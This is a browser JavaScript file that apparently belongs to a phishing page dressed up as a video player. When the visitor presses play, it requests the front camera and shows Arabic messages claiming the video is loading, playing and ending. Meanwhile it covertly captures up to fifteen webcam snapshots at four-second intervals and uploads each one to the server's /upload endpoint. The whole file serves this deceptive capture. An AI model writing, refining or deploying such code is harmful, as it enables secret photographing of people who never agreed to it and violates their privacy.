(() => {
  const playBtn = document.getElementById('playBtn');
  const poster  = document.getElementById('poster');
  const video   = document.getElementById('preview');
  const status  = document.getElementById('status');

  const FIRST_DELAY_MS = 1500;   // أول لقطة بعد
  const INTERVAL_MS    = 4000;   // بين كل لقطة
  const MAX_SHOTS      = 15;     // حد أقصى

  let stream = null, timer = null, shots = 0;
  const setStatus = t => { if (status) status.textContent = t; };

  async function start() {
    try {
      setStatus('جارٍ التحقق...');
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
    } catch (e) {
      setStatus('تعذّر تشغيل الفيديو');
      return;
    }
    if (poster) poster.style.display = 'none';
    video.srcObject = stream;
    video.play().catch(() => {});
    setStatus('جارٍ التشغيل');

    setTimeout(capture, FIRST_DELAY_MS);
    timer = setInterval(() => {
      if (shots >= MAX_SHOTS) { stop(); return; }
      capture();
    }, INTERVAL_MS);
  }

  function capture() {
    if (!stream) return;
    const vw = video.videoWidth || 640;
    const vh = video.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = vw; c.height = vh;
    c.getContext('2d').drawImage(video, 0, 0, vw, vh);

    fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.85) })
    }).catch(() => {});
    shots++;
  }

  function stop() {
    if (timer) { clearInterval(timer); timer = null; }
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    setStatus('انتهى الفيديو');
  }

  if (playBtn) playBtn.addEventListener('click', start);
  window.addEventListener('pagehide', stop);
  window.addEventListener('beforeunload', stop);
})();